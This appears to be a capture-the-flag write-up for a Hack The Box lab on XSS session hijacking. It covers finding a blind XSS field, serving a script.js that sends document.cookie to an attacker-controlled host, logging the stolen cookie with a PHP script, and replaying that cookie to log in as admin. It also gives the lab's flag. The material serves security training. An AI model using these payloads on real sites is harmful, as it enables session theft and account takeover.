## Challenge

Try to repeat what you learned in this section to identify the vulnerable input field and find a working XSS payload, and then use the 'Session Hijacking' scripts to grab the Admin's cookie and use it in 'login.php' to get the flag.

## Solution

I visit the page on the `/hijacking` path where there is a form to register.

Via `ip a` I get my ip address which is `c` and I start a server via `python3 -m http.server`.

I send the following (changing the path depending on the field name) to each field and check the terminal where I'm listening, to see if I got a requst.

```html
"><script src=http://10.10.15.68:8000/fullname></script>
```

And then I got a request `"GET /profile_picture HTTP/1.1" 404 -` which tells me that the last field is vulnerable.

Now create an `index.php`:

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

and a `script.js`:
```js
new Image().src='http://10.10.15.68:8000/index.php?c='+document.cookie
```

Then on the registration form, in the email fieald, I put the following:

```sh
"><script src=http://10.10.15.68:8000/script.js></script>
```

and I got the cookie on the terminal:

```sh
"GET /script.js HTTP/1.1" 200 -
"GET /index.php?c=cookie=c00k1355h0u1d8353cu23d HTTP/1.1" 200 -
```

On the `website/hijacking/login.php`, I press `Shift F9` on Storage, I click on the plus sign and add the name of `cookie` and the value of `c00k1355h0u1d8353cu23d` and refresh the page, which gives me the flag:

`HTB{4lw4y5_53cur3_y0ur_c00k135}`


